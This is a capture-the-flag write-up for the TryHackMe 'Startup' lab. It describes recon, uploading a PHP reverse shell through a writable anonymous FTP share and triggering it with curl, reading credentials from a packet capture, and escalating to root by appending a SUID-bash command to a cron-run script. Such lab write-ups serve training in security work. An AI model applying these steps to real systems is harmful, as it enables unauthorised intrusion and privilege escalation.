---
title: Startup
description: Writeup for the TryHackMe machine Startup
date: 2020-11-08
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds three open ports: FTP (21), SHH (22) and HTTP (80).
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.2.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
```

### FTP - TCP 21

Anonymous FTP login is allowed:
```console
ftp> dir
229 Entering Extended Passive Mode (|||8692|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```
The files `important.jpg` and `notice.txt` aren't particularly interesting. However, the `ftp` folder is writable, which could be useful.
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
{: file="notice.txt" }

### HTTP - TCP 80

I use `gobuster` to enumerate directories:
```console
$ gobuster dir -u "http://startup.thm/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404 -t 200 --timeout 40s -k
/files                (Status: 301) [Size: 310] [--> http://startup.thm/files/]
```
The `/files` directory lists the same files as the FTP server.

## Shell as www-data

I upload a PentestMonkey PHP reverse shell via FTP to the `ftp` directory:
```console
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||12139|)
150 Ok to send data.
100% |**********************************************************************************************************************************************************************|  5492       29.59 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (76.60 KiB/s)
```
Then I trigger the reverse shell by fetching the uploaded file:
```console
$ curl http://startup.thm/files/ftp/php-reverse-shell.php
```

## Shell as lennie
On the target machine, I find `/recipe.txt`, which answers the first question:
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was <REDACTED>.
```
Additionally, I discover an uncommon directory `/incidents/` containing a `.pcapng` capture file:
```console
www-data@startup:$ ls -la /incidents
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Apr  3 15:29 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```
I download the file and open it with Wireshark. Following the TCP streams, I find credentials in stream 7 for the user `lennie`:
```console
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: <REDACTED>
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: <REDACTED>
```
Using these credentials, I am able to SSH into the machine as `lennie`.

## Shell as root

I use `pspy` to monitor processes and spot a recurring cron job:
```
2025/04/03 15:58:21 CMD: UID=0     PID=1      | /sbin/init 
2025/04/03 15:59:01 CMD: UID=0     PID=20234  | /bin/bash /etc/print.sh 
2025/04/03 15:59:01 CMD: UID=0     PID=20233  | /bin/bash /home/lennie/scripts/planner.sh 
2025/04/03 15:59:01 CMD: UID=0     PID=20232  | /bin/sh -c /home/lennie/scripts/planner.sh 
2025/04/03 15:59:01 CMD: UID=0     PID=20231  | /usr/sbin/CRON -f
```
The script `planner.sh` runs every minute:
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
{: file="/home/lennie/scripts/planner.sh" }

Although `planner.sh` is owned by `root` and not writable, the `/etc/print.sh` script is owned by `lennie` and can be modified:
```console
$ ls -la /home/lennie/scripts/planner.sh
-rwxr-xr-x 1 root root 77 Nov 12  2020 /home/lennie/scripts/planner.sh
$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```
I append the following line to `/etc/print.sh` to create a SUID `bash` binary:
```console
$ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /etc/print.sh
```
After waiting for the cron job to run, I escalate privileges using the SUID `bash`:
```console
$ /tmp/bash -p
```
